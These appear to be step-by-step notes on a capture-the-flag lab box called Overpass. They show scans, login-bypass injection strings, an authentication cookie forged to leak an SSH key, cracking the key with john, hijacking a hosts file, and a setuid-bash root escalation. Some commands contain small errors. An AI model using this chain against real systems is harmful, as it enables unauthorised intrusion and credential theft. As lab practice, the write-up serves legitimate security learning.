1.) Used nmap to find open ports and more information on what services.
  - nmap -sC -sV 10.10.49.212
    - 22/tcp open
    -80/tcp open
2.) Used gobuster to find hidden directories 
  - gobuster -dir -u http://10.10.49.212 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
    - adnmin found
3.) go to admin directory
  - tried sql injections in login like ' OR 1=1 -- or " OR=1 -- both username and password
  - check page source
    - found that the page source has a cookie vuln
4.) curl the ip, check for cookie parameter
  - needs a parameter, set the cookie value to anything i want
  - private rsa key found
  - go into console of the admin page, Cookies.set("SessionToken","anybvalue")
    - shows rsa key on page 
5.) put private rsa key into a file called id_rsa
  - use john to covert it to something it could read
    - ./ssh2john.py /root/id_rsa > /root/hash.txt
6.) then use john to find passwords for the hash file
  - john --wordlists=/usr/share/wordlists/rockyou.txt /root/hash.txt
    - pw = james13 
7.) login ssh 
  - ssh -i id_rsa james@10.10.49.212
    -use pw to login
8.) search through directory,
  - found rot47 crypt withihn overpass, cipher it
    - name is System and pw is saydrawnlyingpicture
9.) transfer linpeas through netcat
10.) use linpeas on james or destined host to find any vulnerabilities.
  - found vuln with overpass.thm
    - found w/r in /etc/host
11.) modify host file with our host
    nano /etc/host
      - change location of overpass.thm with our address and ping to test
12.) create a bash script on source addresss to give us accessible root access
    - chmod +s /bin/bash
      - /bin/bash -p to get into root
